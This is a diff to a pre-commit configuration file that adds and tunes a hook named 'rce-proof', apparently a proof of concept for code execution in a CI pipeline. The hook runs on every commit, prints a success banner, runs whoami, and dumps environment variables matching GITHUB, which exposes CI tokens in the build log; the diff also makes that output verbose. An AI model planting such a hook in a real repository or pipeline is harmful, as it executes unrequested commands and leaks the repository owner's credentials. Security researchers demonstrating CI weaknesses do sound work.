@@ -3,7 +3,8 @@ repos:
   hooks:
     - id: rce-proof
       name: rce-proof
-      entry: bash -c "echo '!!! RCE SUCCESSFUL !!!' && echo 'User:' && whoami && echo 'Token Permissions:' && env | grep GITHUB"
+      entry: bash -c "echo '!!! RCE SUCCESSFUL !!!' && whoami && env | grep GITHUB"
       language: system
       always_run: true
       pass_filenames: false
+      verbose: true
